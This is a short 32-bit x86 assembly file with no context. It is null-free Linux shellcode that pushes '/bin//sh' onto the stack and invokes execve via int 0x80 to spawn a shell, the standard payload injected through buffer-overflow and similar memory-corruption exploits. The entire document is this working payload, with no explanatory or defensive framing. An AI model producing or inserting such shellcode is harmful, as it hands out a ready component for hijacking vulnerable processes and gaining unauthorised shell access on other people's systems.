BITS 32

global _start
_start:
  sub esp, 0x100
  xor eax, eax
  push eax
  mov ecx, esp
  mov edx, esp
  push dword 0x68732f2f
  push dword 0x6e69622f
  mov al, 0xb
  mov ebx, esp
  int 0x80

